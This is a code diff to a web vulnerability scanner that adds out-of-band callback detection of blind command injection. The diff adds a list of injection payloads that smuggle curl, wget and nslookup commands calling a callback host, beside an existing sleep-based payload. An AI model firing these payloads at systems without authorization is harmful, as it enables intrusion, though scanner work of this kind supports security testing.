@@ -3,6 +3,7 @@
 Detects:
   * direct in-band command injection (echoed marker)
   * blind RCE via response timing (sleep payloads)
+  * **blind RCE via OOB DNS/HTTP callback** (interactsh)
   * SSTI engines that evaluate {{7*7}} -> 49 etc.
 """
 from __future__ import annotations
@@ -21,12 +22,24 @@ MARKER_RE = re.compile(r"SX_([a-z0-9]{4,12})_OK")
 SSTI_PRODUCT_RE = re.compile(r"\b49\b")
 SSTI_OBJECT_HINTS = ("<class 'object'>", "<built-in", "java.lang", "Werkzeug")
 
+OOB_TEMPLATES = [
+    ";curl http://{host}/sx;",
+    "|curl http://{host}/sx",
+    "&& wget -qO- http://{host}/sx",
+    "$(curl http://{host}/sx)",
+    "`curl http://{host}/sx`",
+    ";nslookup {host};",
+    "|nslookup {host}",
+    "%0acurl%20http://{host}/sx",
+]
+
 
 async def scan(ctx: "Context", url: str, params: list[str], method: str = "GET", form=None):
     findings: list[dict] = []
     rce_payloads = ctx.payloads.for_category("rce", limit=18)
     ssti_payloads = ctx.payloads.for_category("ssti", limit=12)
     sem = asyncio.Semaphore(int(ctx.config.get("concurrency", {}).get("scanner_workers", 8)))
+    oob_tokens: dict[str, str] = {}
 
     async def test(param: str) -> None:
         # ----- in-band OS command injection -----
@@ -48,6 +61,15 @@ async def scan(ctx: "Context", url: str, params: list[str], method: str = "GET",
                 return
             ctx.memory.record_payload_result(p, "rce", False)
 
+        # ----- blind RCE via OOB callback -----
+        if ctx.oob and ctx.oob.registered:
+            token = ctx.oob.token()
+            host = ctx.oob.host_for(token)
+            oob_tokens[param] = token
+            for tpl in OOB_TEMPLATES:
+                async with sem:
+                    await _request(ctx, url, method, param, tpl.format(host=host), form)
+
         # ----- blind RCE via timing -----
         sleep_payload = ";sleep 5;"
         t0 = time.perf_counter()
@@ -60,7 +82,7 @@ async def scan(ctx: "Context", url: str, params: list[str], method: str = "GET",
                 "title": f"Blind OS command injection in `{param}` (time-based)",
                 "severity": "critical", "cvss": 9.8,
                 "url": url, "parameter": param, "payload": sleep_payload,
-                "evidence": f"Response delayed {elapsed:.2f}s after injecting `;sleep 5;` — confirms blind RCE.",
+                "evidence": f"Response delayed {elapsed:.2f}s after `;sleep 5;` — confirms blind RCE.",
                 "request": f"{ev.method} {ev.url}",
                 "metadata": {"elapsed_s": elapsed},
             })
@@ -94,6 +116,24 @@ async def scan(ctx: "Context", url: str, params: list[str], method: str = "GET",
             ctx.memory.record_payload_result(p, "ssti", False)
 
     await asyncio.gather(*(test(p) for p in params))
+
+    # poll OOB once for any blind RCE callbacks
+    if ctx.oob and ctx.oob.registered and oob_tokens:
+        await asyncio.sleep(2.0)
+        for param, token in oob_tokens.items():
+            events = await ctx.oob.poll(token)
+            if events:
+                findings.append({
+                    "category": "rce",
+                    "title": f"Blind OS command injection in `{param}` (OOB)",
+                    "severity": "critical", "cvss": 9.8,
+                    "url": url, "parameter": param, "payload": f"oob://{token}",
+                    "evidence": f"OOB callback received from injected command "
+                                f"({len(events)} interactions) — confirms blind RCE.",
+                    "request": f"{method.upper()} {url}",
+                    "metadata": {"detection": "oob",
+                                 "kinds": sorted({e.get("protocol", "?") for e in events})},
+                })
     return findings
 
 
